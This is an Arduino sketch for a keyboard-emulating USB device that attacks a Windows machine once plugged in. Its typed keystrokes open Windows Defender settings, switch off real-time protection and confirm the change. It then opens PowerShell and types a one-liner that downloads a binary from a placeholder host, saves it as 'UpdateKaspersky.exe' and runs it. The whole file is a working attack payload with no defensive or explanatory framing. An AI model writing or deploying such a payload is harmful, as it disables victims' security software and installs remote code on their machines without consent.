#include <Keyboard.h>'

// Utility function
void typeKey(int key){
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup()
{

  Keyboard.begin();

   // Start Payload
  delay(3000);

  // Open Windows Defender settings

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_ESC);
  Keyboard.releaseAll();

  delay(1000);

  Keyboard.print("Windows Defender Settings");

  delay(100);

  typeKey(KEY_RETURN);

  // Navigate to realtime protection and disable it

  delay(1000);

  typeKey(KEY_RETURN);

  delay(1000);

  typeKey(KEY_RETURN);

  delay(1000);

  typeKey(KEY_TAB);

  delay(250);

  typeKey(KEY_TAB);

  delay(250);

  typeKey(KEY_TAB);

  delay(250);

  typeKey(KEY_TAB);

  typeKey(KEY_RETURN);

  delay(1000);

  typeKey(' ');

  delay(1000);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('y');
  Keyboard.releaseAll();
  delay(500);

  // Close Settings

  delay(500);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  Keyboard.releaseAll();

  delay(500);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  Keyboard.releaseAll();

  delay(3000);

  // 3 second delay for device to register

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(1700);
  Keyboard.print("powershell");  
  typeKey(KEY_RETURN);
  delay(200);
  Keyboard.print("$down = New-Object System.Net.WebClient; $url = 'http://xxx.xxx.xxx/shellby.bin'; $file = 'UpdateKaspersky.exe'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;");
  delay(150);
  typeKey(KEY_RETURN);
  Keyboard.end();
}

// Unused
void loop() {}
